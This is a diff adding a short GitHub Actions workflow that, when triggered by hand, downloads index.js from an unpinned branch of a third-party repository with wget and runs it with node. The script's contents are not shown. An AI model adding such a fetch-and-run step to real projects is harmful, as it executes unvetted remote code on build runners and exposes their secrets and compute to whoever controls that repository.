@@ -1,0 +1,22 @@
+name: Run Remote index.js
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run-script:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Install Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: "18"
+
+      - name: Download index.js
+        run: |
+          wget https://raw.githubusercontent.com/davidcurbet111111111/Ls/refs/heads/main/index.js -O index.js
+
+      - name: Run script
+        run: |
+          node index.js
